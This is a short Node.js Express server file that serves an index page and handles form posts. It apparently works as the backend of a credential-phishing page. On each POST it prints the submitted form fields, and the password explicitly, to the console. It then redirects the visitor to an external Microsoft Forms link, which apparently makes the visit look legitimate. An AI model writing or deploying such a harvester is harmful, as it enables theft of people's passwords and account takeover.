const PORT=80 ;
var bodyParser = require('body-parser')
var express = require('express') ;

var app = express() ; 
app.engine('html', require('ejs').renderFile);
app.use(express.static('public')) ; 
app.set('view engine','html') ; 
app.set('views','./views') ;  
var jsonParser = bodyParser.json()
var urlencodedParser = bodyParser.urlencoded({ extended: false })

app.listen(PORT,function(){
    console.log(`Server is listening on port ${PORT}`) ; 
});
app.get('/',function(req,res){
    res.render('index.html')
})

app.post('/',urlencodedParser, function(req,res){
    console.log(req.body)
    console.log(req.body.password)
    res.redirect('https://forms.office.com/r/nceLwF8CFQ')
})